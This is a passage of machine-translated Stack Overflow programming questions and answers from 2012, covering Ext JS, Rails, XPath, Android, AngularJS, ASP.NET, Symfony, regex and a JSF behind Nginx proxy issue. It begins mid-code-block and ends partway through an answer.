        throw new UnsupportedOperationException("Not supported yet.");
    }

} 
```

参考：

*   [http://docs.oracle.com/javase/7/docs/api/javax/swing/border/Border.html](http://docs.oracle.com/javase/7/docs/api/javax/swing/border/Border.html)

# extjs - Ext JS - 使用过滤器预配置 Grid 的 Store

> ID：11935194
> 
> 赞同：0
> 
> 时间：2012-08-13T13:26:25.497
> 
> 标签：extjs, extjs3

我正在尝试在不同的选项卡下重用网格。

有没有一种方法可以为该网格建立一个集中存储并根据过滤器在不同的选项卡下显示数据？换句话说，我可以通过设计器/在事件处理程序中将商店添加到带有数据过滤器的网格中吗？

我正在使用 Ext JS: 3.4 (如果有帮助的话)

这是我正在寻找的快照。

![在此处输入图像描述](../Images/0c7614cf6c384b576cf248976679677f.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:48:49.363

您可能可以创建 4 个网格，链接到一个商店。

然后你必须听 tabchange 事件（[http://docs.sencha.com/ext-js/3-4/#!/api/Ext.TabPanel-event-tabchange](http://docs.sencha.com/ext-js/3-4/#!/api/Ext.TabPanel-event-tabchange)），找出你有哪个标签选择（http://docs.sencha.com/ext-js/3-4/#!/api/Ext.Panel-method-getComponent），然后根据您使用的选项卡再次过滤您的商店。(http://docs.sencha.com/ext-js/3-4/#!/api/Ext.data.Store-method-filter)

# ruby-on-rails-3 - 如何在另一个类的控制器中销毁一个类的实例变量

> ID：11935195
> 
> 赞同：0
> 
> 时间：2012-08-13T13:26:28.357
> 
> 标签：ruby-on-rails-3

我正在使用 Rails 进行敏捷 Web 开发的章节练习。这是一家商店，您可以将产品添加到购物车中。购物车内的产品称为 LineItem。您可以删除购物车中的单个订单项。当最后一个订单项被删除时，我希望整个购物车都被销毁。我的代码不起作用：

**购物车控制器**

```
def destroy
  @cart = current_cart
  @cart.destroy
  session[:cart_id] = nil

  respond_to do |format|
    format.html { redirect_to store_path }
    format.json { head :no_content }
  end
end 
```

**LineItems 控制器**

```
def destroy
  @cart = current_cart
  @line_item = LineItem.find(params[:id])
  quantity = @line_item.quantity

  if quantity > 1
    quantity -= 1
    @line_item.update_attribute(:quantity, quantity)
  else
    @line_item.destroy
  end

  respond_to do |format|
    format.html {
      if @cart.line_items.empty?
        @cart.destroy
      else
        redirect_to @cart
      end
    }
    format.json { head :no_content }
  end
end 
```

这会产生以下错误：

```
Template is missing

Missing template line_items/destroy, application/destroy with {:locale=>[:en], :formats=>[:html], :handlers=>[:erb, :builder, :coffee]}. Searched in: * "/home/mike/Projects/depot/app/views" 
```

当购物车被毁坏时，我想在 store_path 结束。

谢谢，迈克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:33:15.410

见补充（作为评论）：

```
 if @cart.line_items.empty?
    @cart.destroy
    # redirect_to store_path
  else 
```

# c# - 在 C# 中通过 XPath 获取数据

> ID：11935196
> 
> 赞同：2
> 
> 时间：2012-08-13T13:26:36.123
> 
> 标签：c#, xml, xpath

所以我有这个 XML：

```
<?xml version="1.0" encoding="utf-8"?>
<M_ChucVu>
  <ChucVu>
    <MaChucVu>1
    </MaChucVu>
    <TenChucVu>
    </TenChucVu>
  </ChucVu>
  <ChucVu>
    <MaChucVu>2
    </MaChucVu>
    <TenChucVu>
    </TenChucVu>
  </ChucVu>
  <ChucVu>
    <MaChucVu>23</MaChucVu>
    <TenChucVu>12</TenChucVu>
  </ChucVu>
  <ChucVu>
    <MaChucVu>44</MaChucVu>
    <TenChucVu>44</TenChucVu>
  </ChucVu>
</M_ChucVu> 
```

我想检索`ChucVu`包含空`TenChucVu`标签的标签，所以结果是这样的：

```
<ChucVu>
  <MaChucVu>1
  </MaChucVu>
  <TenChucVu>
  </TenChucVu>
</ChucVu>
<ChucVu>
  <MaChucVu>2
  </MaChucVu>
  <TenChucVu>
  </TenChucVu>
</ChucVu> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T13:32:10.757

```
XDocument doc = ...;
var query = doc.XPathSelectElements("//ChucVu[TenChucVu='']"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T13:46:53.603

另一个应该工作的 XPath

```
/M_ChucVu[./ChucVu/TenChucVu=''] 
```

例如

```
 var doc = new XmlDocument();
        doc.LoadXml(yourXmlString);
        var elem = doc.DocumentElement;
        var sel = elem.SelectNodes("/M_ChucVu[./ChucVu/TenChucVu!='']");
        // print or use sel.InnerXml 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-13T13:32:09.310

您需要的 XPath 是：

```
/*/ChucVu[not(string(TenChucVu))] 
```

或者

```
/*/ChucVu[string-length(TenChucVu)=0] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T13:51:39.877

你可以这样：

```
 string xparth = String.Format("//ChucVu[TenChucVu='{0}']", '');
            XmlDocument doc = new XmlDocument();
            doc.Load("Xml");
            XmlElement root = doc.DocumentElement;
            XmlNode node = root.SelectSingleNode(xparth);
            XmlNodeList list = root.SelectNodes(xparth); 
```

# java - Java/Android，是否可以获取对象的内容？

> ID：11935197
> 
> 赞同：0
> 
> 时间：2012-08-13T13:26:35.540
> 
> 标签：java, android, listview, onclick

正如标题所示。我做了一些研究并尝试了杰克逊，这似乎应该有效，但我在尝试使用它时遇到了荒谬的错误，所以这似乎是不行的。

基本上我的问题是这样的，我的列表视图由适配器填充，如下所示：

```
friendsArrayAdapter = new FriendsArrayAdapter(
        NetPlay.this, R.layout.rowlayout,      friends);
listView.setAdapter(friendsArrayAdapter);
friendsArrayAdapter.notifyDataSetChanged(); 
```

然后我想在这个列表视图中处理 onClick 事件，将该列表视图的内容复制到一个变量中：

```
listView.setClickable(true);
listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
        @Override
        public void onItemClick(AdapterView<?> arg0, View arg1, 
                int position, long arg3) {

           Object o = listView.getItemAtPosition(position);
           Object o = arg0.getItemAtPosition(position);

         //mText.setText(o);
        }
 }); 
```

现在这一切正常，但返回的值是实际的对象 ID/参考显示为某事@Friends.21312。我想要的是应该是名称+ ID 的实际内容。

这甚至可能还是我需要重做我的整个列表视图人口？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:32:58.733

```
public void onItemClick(AdapterView<?> arg0, View arg1, int position, long arg3) {

       //friends is the array that is given to the Adapter.
       //given friends = Friend[]
       Friend f = friends[position];
       f.getName();
       f.getID();
} 
```

这只是一个猜测，请发布您的整个代码以获得更好的帮助！

# timezone - Google auth2 API 缺少时区信息？

> ID：11935200
> 
> 赞同：6
> 
> 时间：2012-08-13T13:26:39.480
> 
> 标签：timezone, oauth-2.0

最近我开始为我的网络应用程序使用[http://code.google.com/p/google-api-php-client/](http://code.google.com/p/google-api-php-client/) ( [Google OAuth2 )。](https://code.google.com/p/google-api-php-client/source/browse/trunk/src/contrib/Google_Oauth2Service.php)但是我画了一个空白，因为我无法为我的用户读取时区。我尝试以某种方式在我的 Google 帐户页面上输入它，但我没有找到任何这样的字段。有谁知道谷歌是否真的提供这样的信息，如果是这样，我如何将它设置到我的帐户中？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-14T17:45:48.790

您可以使用的最接近的东西是您的 Google 日历上可用的时区。检查日历设置页面上的“常规”标签：https: [//www.google.com/calendar](https://www.google.com/calendar)

现在，您可以在向用户验证您的服务时请求访问用户的日历。使用范围“ [https://www.googleapis.com/auth/calendar](https://www.googleapis.com/auth/calendar) ”（[文档](https://developers.google.com/google-apps/calendar/auth)）

当您通过身份验证后，您可以[请求您感兴趣的日历](https://developers.google.com/google-apps/calendar/v3/reference/calendars/get)。我猜用户的主日历是你最好的选择。

最后，每个日历都有带有[timeZone 属性](https://developers.google.com/google-apps/calendar/v3/reference/calendars#resource)的设置。

[这是 Google API PHP 客户端的示例代码。](https://code.google.com/p/google-api-php-client/source/browse/trunk/examples/calendar/simple.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T00:21:36.977

自 2013 年 3 月 21 日起，Google 不会在他们对 userinfo.profile 端点的响应中提供此信息——即使他们声称他们会这样做。

该文档声称时区可用： [https ://developers.google.com/accounts/docs/OAuth2Login?hl=en#userinfocall](https://developers.google.com/accounts/docs/OAuth2Login?hl=en#userinfocall)

但是，当前实现仅返回以下数据：

*   ID
*   电子邮件
*   验证电子邮件
*   姓名
*   给定的名称
*   姓
*   链接（指向 G+ 个人资料，如果有）
*   性别
*   生日
*   语言环境
*   hd（似乎是 Google Apps 域，如果相关）

请注意，上面列出的页面上的当前文档中未列出“生日”和“高清”。我正在从端点收到的真实响应中验证这些字段。

目前获取时区的最佳方法可能是使用 JavaScript（从用户的浏览器中检索时区）。这个 StackOverflow 答案解释了如何做到这一点：

[在 JavaScript 中获取客户端的时区](https://stackoverflow.com/questions/1091372/getting-the-clients-timezone-in-javascript)

不幸的是，这必须作为次要操作发生，这意味着您必须将此数据与从端点检索的数据分开添加到您的数据库中。要考虑的一个技巧是在您发起端点请求的页面上捕获时区偏移量，然后将时区偏移量值附加到 OAuth 请求中的“状态”值。然后，该值将在回调中返回，您可以将其提取并添加到在您写入数据库的同一过程中返回的其他配置文件信息中。

# javascript - javascript 未从 asp.net 4.0 正确解释

> ID：11935202
> 
> 赞同：0
> 
> 时间：2012-08-13T13:27:00.070
> 
> 标签：javascript, asp.net-4.0

我最近从 asp.net 3.5 升级到 4.0。从那以后，我在超链接中遇到了一些关于 javascript 的随机问题。据我所知，浏览器没有正确解释某些超链接中的 javascript。例如，我有一个用于站点地图的 TreeView。有人正在单击“展开/折叠”图像，而不是执行 javascript，而是试图将它们定向到页面：

```
javascript:TreeView_ToggleNode(ctl00_MainContent_TreeView1_Data,1,ctl00_MainContent_TreeView1n1,&#39; &#39;,ctl00_MainContent_TreeView1n1Nodes) 
```

我知道这种情况正在发生，因为我收到错误“从客户端 (:) 检测到潜在危险的 Request.Path 值”。从生成的请求到“javascript:TreeView_Toggle ...”。

这只是一个例子。我在其他链接上也遇到了一些其他错误。它也不是特定的浏览器。它的范围从 IE6 到 Firefox 14。

我也不肯定这在我升级之前没有发生，并且升级刚刚捕获了这些“潜在危险的请求”。但是我有

```
requestValidationMode="2.0" 
```

我自己无法重现此错误。我刚刚从网站上发生错误时收到的电子邮件中看到了这一点。

任何建议和/或建议将不胜感激。谢谢

# android - 调用 LocationManager 一次并保存在内存中，还是只在需要时调用它更好？

> ID：11935203
> 
> 赞同：2
> 
> 时间：2012-08-13T13:27:05.237
> 
> 标签：android, optimization, memory-management, locationmanager

这是一个与 LocationManager 相关的效率问题（更普遍的是，在 Android 中管理内存与 CPU 使用情况）。假设我有一个长期运行的服务，它希望每 60 秒使用一次 LocationManager 的 getLastKnownLocation 方法来更新位置。该服务使用一个 TimerTask 和一个 Time 重复固定延迟执行。是创建一个实例字段 mLocationManager 并在服务的生命周期内保留它更好，还是在 TimerTask 的每次执行时实例化 LocationManager 更好，据说 VM 只会在需要时保留它？在代码中：

```
public class ProximityService extends Service {

    private LocationManager mLocationManager;

    @Override
    public void onCreate() {
        mLocationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        Timer timer = new Timer();
        TimerTask mGetLastKnownLocationTask = new GetLastKnownLocationTask();
        timer.schedule(mGetLastKnownLocationTask, 0, 60000);
    }

    private class GetLastKnownLocationTask extends TimerTask {

       public void run() {
           Location mLocation = 
               mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
               // Do something with mLocation
       }
    }
...
} 
```

对比

```
...

@Override
public void onCreate() {
    Timer timer = new Timer();
    TimerTask mGetLastKnownLocationTask = new GetLastKnownLocationTask();
    timer.schedule(mGetLastKnownLocationTask, 0, 60000);
}

private class GetLastKnownLocationTask extends TimerTask {

   public void run() {
       LocationManager mLocationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
       Location mLocation = 
           mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
           // Do something with mLocation
   }
} 
```

注意：我不需要 LocationListener 来保持 GPS 处于活动状态。这是在应用程序的另一部分使用单独的服务处理的。在这里，我只想以固定的时间间隔检查最近的已知位置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:34:21.790

获取一次位置管理器，然后注册一个被动位置监听器不是更好吗？当您没有时间获得有效的位置修复时，必须调用 getLastKnownLocation() 应该是一个快速的解决方案，不一定是为了重复使用。

喜欢...

```
 LocationManager lm = (LocationManager)  getSystemService(Context.LOCATION_SERVICE);
    //change best provider to a passive location service.
    String bestProvider = lm.getBestProvider(new Criteria(), true);
    if(bestProvider!=null){
       lm.requestLocationUpdates(bestProvider, 1000 * 60 * 15 ,5000, 
       new LocationListener {

        public void onLocationChanged(Location location) {

        }

        public void onProviderDisabled(String provider) {}

        public void onProviderEnabled(String provider) {}

        public void onStatusChanged(String provider, int status, Bundle extras) {}
        }
        );

    } 
```

# angularjs - AngularJS：我怎样才能获得模板的 $location.path

> ID：11935208
> 
> 赞同：52
> 
> 时间：2012-08-13T13:27:20.573
> 
> 标签：angularjs

我需要模板中 url 的当前路径（$location.path 的内容）。但不是通过控制器，因为我有很多控制器（而且我不想重复声明`$scope.currentUrl = $location.path;`）。感谢您的建议。

* * *

## 回答 #1

> 赞同：92
> 
> 时间：2012-08-13T13:57:32.727

AngularJS 模板只能查看范围内可用的内容，因此您需要以某种方式将 $location 服务放入范围内。AngularJS 应用程序中有一个始终可用的范围，称为 $rootScope，因此它可以用于您的用例。

您可以做的是使用模块的 run() 方法在 $rootScope 中公开 $location：

```
var myApp = angular.module('myApp', []).run(function($rootScope, $location) {
    $rootScope.location = $location;
}); 
```

这将使“位置”在所有模板中都可用，因此稍后您可以在模板中执行以下操作：

```
Current path: {{location.path()}} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-10-24T18:08:07.320

另一种方法是使用更具语义和通用性[的 ui-router](http://angular-ui.github.io/ui-router/)，然后在控制器中[检索当前状态](https://github.com/angular-ui/ui-router/issues/1482)，并将其存储在`$scope`：

```
app.controller('MyCtrl', ['$scope', '$state', function MyCtrl($scope, $state) {
  $scope.state = $state.current.name;
  ...
} 
```

# internet-explorer-8 - 在 Internet Explorer 中查看 HttpOnly 会话 cookie

> ID：11935211
> 
> 赞同：5
> 
> 时间：2012-08-13T13:27:33.540
> 
> 标签：internet-explorer-8, session-cookies, ie-developer-tools

使用 Internet 选项我可以看到所有持久性 cookie，使用开发者工具我可以看到所有 JS 可访问的会话 cookie。似乎没有办法查看 HTTPOnly 会话 cookie。

在 Firefox 中，有许多内置选项和 Firebug 选项来查看 cookie，包括能够查看请求/响应标头。IE8 中是否无法查看 HTTPOnly 会话 cookie？

相关问题（HttpOnly没有解决方案）： [IE7](https://stackoverflow.com/questions/7763621/how-to-view-session-cookies-in-internet-explorer7) [IE8](https://stackoverflow.com/questions/6051811/how-do-you-view-session-cookies-in-internet-explorer)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-04T17:16:31.937

看看这个：http: [//blogs.msdn.com/b/jpsanders/archive/2009/06/04/understanding-the-new-wininet-flag-internet-cookie-httponly.aspx](http://blogs.msdn.com/b/jpsanders/archive/2009/06/04/understanding-the-new-wininet-flag-internet-cookie-httponly.aspx)

> Internet Explorer 8 WinInet.dll 引入了几个新的 Cookie 标志。INTERNET_COOKIE_HTTPONLY 标志允许您读取 WinInet 代码中的 HttpOnly cookie。此标志记录在这里：http: [//msdn.microsoft.com/en-us/library/aa384714](http://msdn.microsoft.com/en-us/library/aa384714(VS.85).aspx) (VS.85).aspx 。

这是一种构建工具并使用它的方法：http: [//www.codeproject.com/Articles/38616/Retrieve-HttpOnly-Session-Cookie-in-WebBrowser](http://www.codeproject.com/Articles/38616/Retrieve-HttpOnly-Session-Cookie-in-WebBrowser)

在 IE8 架子上，我不确定我是否找到了一种检索 HTTPOnlyCookies 的方法，因为开发工具似乎只显示非 HTTPOnly cookie。如果要使用工具，请使用 Fiddler2 并将响应类型设置为 HTTPOnly。

# symfony - 我会为了什么做一个捆绑包？(Symfony 2)

> ID：11935213
> 
> 赞同：7
> 
> 时间：2012-08-13T13:27:41.483
> 
> 标签：symfony, bundle

好的，所以我即将使用 symfony 2 制作一个网站。

我应该只制作一个控制/组合所有其他捆绑包的“主要”捆绑包吗？对于我正在考虑的其他捆绑包，可以说一个控制与照片相关的东西的“画廊”捆绑包，以及一个控制商店部分的“商店”捆绑包。

什么是最好的（或至少是好的）实践以及专业团队将如何做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T14:40:12.287

根据 symfony 文档，bundle 应该是一致且封闭的结构。因此，例如，如果“商店”和“画廊”以某种方式相关（例如，使用相同的模型），那么它们应该在一个包中（AppBundle、CoreBundle、PlatformBundle - 你想要的任何东西）。但是如果画廊是完全独立的一段代码并且可以很容易地加入到另一个项目中——那么你应该考虑将它排除在单独的包中。

我认为一个好主意是查看 github 上的一些项目，看看其他人如何处理这个问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-14T06:30:24.320

请参阅以下问题以及我对它们的回答：

*   [Symfony 2 中的所有东西都应该是一个捆绑包吗？](https://stackoverflow.com/questions/9999433/should-everything-really-be-a-bundle-in-symfony-2)
*   [Symfony2 概念问题：一般捆绑包与特定捆绑包](https://stackoverflow.com/questions/8012191/symfony2-conceptual-issue-general-bundles-vs-specific-ones)

基本上，在我的上一个项目中，我没有将包用于*特定于应用程序的*代码；唯一的例外是那些硬编码成捆绑包的东西——比如我放入的 Doctrine Fixtures—— `AppBundle`。其他一切——模型、控制器、服务、表单类型等——都不在任何捆绑包中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T14:26:35.057

就像@Cyprian 所说的那样，捆绑包是一组可以单独工作的功能。正如开发过程中发生的那样，我们并不总是知道什么时候是分开的。它随着时间而来。

就个人而言，我从 2 月开始使用 Symfony2，并且我从未停止阅读手册和相关书籍以更深入地了解。我向你保证，这很有帮助，而且读起来很有趣：）

这是我[最喜欢的文档页面，是关于美味的启发性博客文章](http://delicious.com/inexisdotnet/mostHelpful+symfony2)。

对于你的直接问题，忘记我们在 symfony 1.x 中所做的“前端”和“后端”。只需考虑模型实体（如在单行中）并构建一个捆绑包。随着代码的增长，您将看到如何在包中反汇编和分离。您只需要记住在小方法中分离您的功能并进行重构。

# android - 使用 ValueAnimator 对 LinearLayout 容器的高度进行动画处理

> ID：11935216
> 
> 赞同：24
> 
> 时间：2012-08-13T13:27:48.590
> 
> 标签：android, animation, android-linearlayout

我有一个 LinearLayout，我用它作为一些按钮和 textview 的容器，我想为它的高度设置动画，以在用户按下“显示”按钮时给人一种布局向下滑动的印象。

我在我的 xml 中将 LinearLayout 设置为 layout_height="0dp" 和 visibility="gone"。然后我希望将其设置为可见，并且需要任何高度来包装内容。目前，我什至根本无法对其进行动画处理，更不用说换行内容的高度了。

这是我的动画方法：

```
private void toggle(final LinearLayout v) {
    v.setVisibility(View.VISIBLE);
    ValueAnimator va = ValueAnimator.ofInt(0, 300);
    va.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {
        public void onAnimationUpdate(ValueAnimator animation) {
            Integer value = (Integer) animation.getAnimatedValue();
            v.getLayoutParams().height = value.intValue();
            v.invalidate();

        }
    });

    va.start();
} 
```

也许问题是我如何设置 LinearLayout 的高度？还是我误解了ValueAnimator的功能？我查看了 Chet Haase 的博客文章，但它们不包含任何特定的高度动画示例。我也没有找到很好的例子来说明如何使用 3.0+ 的 API 处理高度动画。希望对此有所帮助，谢谢！

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-08-13T13:52:05.087

看这篇博文：http: [//tech.chitgoks.com/2011/10/29/android-animation-to-expand-collapse-view-its-children/](http://tech.chitgoks.com/2011/10/29/android-animation-to-expand-collapse-view-its-children/)我发现我不应该使用`view.invalidate()`布局重绘。我应该使用`view.requestLayout()`.

因此代码变成了这样：

```
ValueAnimator va = ValueAnimator.ofInt(0, height);
    va.setDuration(700);
    va.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {
        public void onAnimationUpdate(ValueAnimator animation) {
            Integer value = (Integer) animation.getAnimatedValue();
            v.getLayoutParams().height = value.intValue();
            v.requestLayout();
        }
    }); 
```

我只是想添加一个关于如何获得 LinearLayout 的高度以及使动画动态的注释。要获得高度，首先需要绘制所有视图。因此，我们必须监听一个告诉我们绘图已完成的事件。这可以通过这样的 onResume() 方法完成（请注意，在我的 xml 中，我已将容器声明为 wrap_content 的高度并且它也是可见的，因为我想从一开始就隐藏它，我在测量它之后这样做）：

```
@Override
    public void onResume() {
        super.onResume();
        final ViewTreeObserver vto = filterContainer.getViewTreeObserver();
        vto.addOnGlobalLayoutListener(new OnGlobalLayoutListener() {
            @Override
            public void onGlobalLayout() {
                height = filterContainer.getHeight();
                filterContainer.setVisibility(View.GONE);
                filterContainer.getLayoutParams().height = 0;
                filterContainer.requestLayout();
                ViewTreeObserver obs = filterContainer.getViewTreeObserver();
                obs.removeGlobalOnLayoutListener(this);
            }
        });
    } 
```

# extjs4.1 - 如何在extjs4的网格模型中使用primaryKey

> ID：11935218
> 
> 赞同：0
> 
> 时间：2012-08-13T13:27:56.860
> 
> 标签：extjs4.1

我有一个带有一个网格模型的网格面板。如何设置该网格存储的主键，以便防止重复值。我的模型是：

```
Ext.define('product',{
        extend : 'Ext.data.Model',
            fields: [{name: 'name',type: 'string'}, 
            {name: 'column1', type: 'int'},  
            {name: 'column2', type: 'int'}]
     associations: [{type: 'belongsTo',model: 'product',primaryKey: 'column1'}]
}); 
```

我怎样才能使用这个主键来防止两次输入相同的记录？！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:18:29.463

您不能使用 Extjs 在模型上“设置”主键。图书馆中不存在这个概念本身。记录的 ID 必须是唯一的，但实际上并没有强制它如此。我的问题是，当添加重复记录时，您甚至想要做什么？您是否希望根据键覆盖记录的值？你想要一个例外吗？

我可以为您提供的最佳建议是在商店中使用“添加”事件并用如下代码填充它：

```
var myStore = Ext.create("Ext.data.Store", {
    listeners: {
        add: function(store, records){
            var checkRecords = store.getRange();//get the records to check against
            //clean out the records from the set that were just added
            for(var i = 0; i < records.length; i++)
                Ext.Array.remove(checkRecords, records[i]);

            for(var i = 0; i < checkRecords.length; i++)
            {
                for( var j = 0; j < records.length; j++)
                {
                    if(checkRecords[i].get("primary_key") == records[j].get("primary_key"))
                        throw "Duplicate primary key: " + records[j].get("primary_key");
                }
            }
        }
    }
}); 
```

该代码将引发异常，但不会停止添加记录。

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-09-25T23:43:38.760

idProperty 呢？

如果您在模型上设置了 idProperty，它将充当主键。

# parsing - S 属性语法可以指定 AST？

> ID：11935225
> 
> 赞同：1
> 
> 时间：2012-08-13T13:28:08.120
> 
> 标签：parsing, antlr, grammar, abstract-syntax-tree, context-free-grammar

据我了解，在[ANTLR](http://www.antlr.org/)中使用返回值和元素标签足以构建 AST。例如

```
r returns [int c, String d] :   
        a='class' b=ID  ... {$c=$b; $d=$a;} 
```

这种对[eBNF](http://en.wikipedia.org/wiki/EBNF)的扩展称为[S 属性语法](http://en.wikipedia.org/wiki/S-attributed_grammar)吗？

以这种方式构建 AST 很常见吗？

我对从这个属性语法中[解析](http://en.wikipedia.org/wiki/Unparsing)一个 AST（**不是**解析树）构建特别感兴趣。将属性限制为纯赋值有什么好处吗？（没有函数调用，例如`$c= fun($a)`）我已经[在 SO 上](https://stackoverflow.com/questions/11918961/unparse-ast-oexpn)解释了我的解析问题。

# javascript - ASP.net javascript 在 asp:ImageButton 上触发

> ID：11935226
> 
> 赞同：0
> 
> 时间：2012-08-13T13:28:07.703
> 
> 标签：javascript, jquery, asp.net

嘿，我想弄清楚为什么我的页面加载时会出现此错误：

```
 Compiler Error Message: BC30456: 'showNotifier' is not a member of 'ASP.pro_aspx'. 
```

showNotifier 是一个 javascript 调用，我必须使用 jQuery 显示从浏览器屏幕顶部下拉的错误消息。我在我的母版页中加载了 javascript 代码，所以我知道它在任何页面上。

这是我的图像按钮代码：

```
 <asp:ImageButton ID="btnDelete" CommandName="Delete" CommandArgument='<%#Eval("id") %>' Text="Delete" runat="server" CssClass="delIcon" AlternateText="Delete" ToolTip="Delete" ImageUrl="~/del.png" /> 
```

任何帮助都会很棒！

**附加代码**

```
Protected Sub grdView_RowCommand(ByVal sender As Object, ByVal e As System.Web.UI.WebControls.GridViewCommandEventArgs) Handles grdView.RowCommand
    Dim cid As String = e.CommandArgument.ToString
    Dim command As String = e.CommandName.ToString

    If cid.Length <= 0 Then Exit Sub

    Select Case command
        Case "Delete"
            Delete(cid)
    End Select
End Sub 
```

**附加代码 2**

```
Private Sub grdView_RowDataBound(ByVal sender As Object, ByVal e As System.Web.UI.WebControls.GridViewRowEventArgs) Handles grdView.RowDataBound
    If (e.Row.RowType = DataControlRowType.DataRow) Then
        Dim l As ImageButton = CType(e.Row.FindControl("btnDelete"), ImageButton)

        l.Attributes("OnClientClick") = "if(msgBoxShow('Are you sure you want to delete " & DataBinder.Eval(e.Row.DataItem, "Name") & "?','" & DataBinder.Eval(e.Row.DataItem, "Name") & "','')==false){return false;}"
    End If
End Sub 
```

Javascript代码是这样的：

```
<script type="text/javascript">
    function msgBoxShow(boxsaying, prodItemName, codeBehind) {
    apprise(boxsaying, {
        'verify': true,
        'textYes': 'Delete ' + prodItemName,
        'textNo': 'Cancel delete'
    },
                function (r) {
                    if (r) {
                        //alert('yes');
                        return true;
                    } else {
                        //alert('no');
                        return false;
                    }
                }
           );
}
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:34:52.147

`OnClick`in an`<asp:ImageButton>`用于识别代码隐藏中的函数，当您单击并将页面回发到服务器时将运行该函数（这与 normal 相同`<asp:Button>`）

你的意思是`OnClientClick`哪个会在客户端运行javascript

* * *

**由于OP的评论而**更新****

 **为了仅在您的本地 javascript 函数返回 false 时返回，请执行以下操作...

```
OnClientClick="if(myFn()==false){return false;}" 
```

这意味着当函数返回时`false`，它将取消对按钮的单击，这意味着表单将不会被发布（这**也**将导致任何客户端验证都不会运行，如果有的话）。

如果函数返回`true`，那么它将继续执行并回发到您的服务器。

关于在服务器上调用正确的函数，我会专门为图像按钮创建一个函数，例如......

```
Protected Sub imgBtn_Click(ByVal sender As Object, ByVal e As EventArgs)
   ...
End Sub 
```

然后你想拥有`OnClick="imgBtn_Click"`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T13:34:57.720

元素的 onClick 属性（尤其是在页面上的数百个元素上）实际上是一种旧的做事方式。特别是如果您关心较旧的浏览器（和 IE6-8），它们会为每个元素创建“脚本”块（每个单独），这些元素基本上都调用相同的东西，并且是相同类型的元素。这些在旧浏览器中极大地减慢了页面速度，我强烈建议不要使用它们。

最好在所有这些项目上简单地创建一个整体实时事件处理程序，如下所示：

```
$(document).on('click', '.delIcon', function () {
    showNotifier(3000,'#cf5050','Delete this?');
}); 
```

这将创建一个等待所有这些项目的事件（使用 delIcon 类）。我假设它也会解决你的问题。ASP.NET 假设 showNotifier 是一个后端方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T13:34:27.797

在您的`ImageButton`,`OnClick`中是指在您的代码隐藏中引用事件处理程序，而不是客户端脚本。你应该`OnClientClick`改用。**

# regex - 正则表达式模式处理括号

> ID：11935229
> 
> 赞同：1
> 
> 时间：2012-08-13T13:28:13.303
> 
> 标签：regex

我正在寻找能够处理以下问题的正则表达式模式：

`(to make someone) happy (adj.)`

我只想得到“快乐”这个词，如果只有一部分在括号中，正则表达式模式也应该处理行，例如：

*   `(to make someone) happy`
*   `happy (adj.)`

我尝试了以下方法：`"\s*\(.*\)"` 但我的想法有点错误！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:38:33.173

这将在所有三个选项的第一个捕获组中为您提供正确的词：

```
(?:\([^)]*\)\s*)?(\w+)(?:\s*\([^)]*\))? 
```

如果您想获得几个单词或允许特殊字符，您可以调整并更加宽容：

```
(?:\([^)]*\)\s*)?([^()\n]+)(?:\s*\([^)]*\))? 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:42:13.290

尝试正则表达式`(?:^|\))\s*([^\(\)]+?)\s*(?:\(|$)`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T13:35:08.333

用于在两个带括号的组之间查找文本的正则表达式是

```
/(?:^|\([^)]*\))([^(]*)(?:$|\([^)]*\))/m 
```

细分如下：

1.  从括号中的一些文本或行首开始：`(?:^|\([^)]*\))`. 这从一个开放的paren匹配到第一个封闭的paren
2.  然后匹配括号外的文本，并放在一个 group`([^(]*)`中。这与下一个开放的括号相匹配。
3.  然后在括号或行尾匹配更多文本：`(?:$|\([^)]*\))`

我使用了多行模式 ( `m`) 以便匹配换行符以及字符串的开头和`^`结尾`$`

# jsf - JSF 和/或 PrimeFaces 样式表和脚本转到 /Project/javax.faces.resource 位置而不是 ./javax.faces.resource

> ID：11935231
> 
> 赞同：1
> 
> 时间：2012-08-13T13:28:19.710
> 
> 标签：jsf, nginx, primefaces

我使用 Nginx 的 proxy_pass 选项将“myproject.com”（例如）设置为“http://localhost:8080/MyProject/”。一切正常，但 PrimeFaces 样式表和脚本试图转到“/MyProject/file”，因为代理到不存在的“http://localhost:8080/MyProject/MyProject/file”，这并不好。如何让 PF 使用 ./file 而不是 /MyProject/file？将 Nginx 的位置块或链接到 MyProject 文件夹是不好的变体。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:06:55.677

尽管我有强烈的印象，这个问题确实需要在 Ngnix 代理端解决，但我将解释如何从 JSF 端“解决”它。

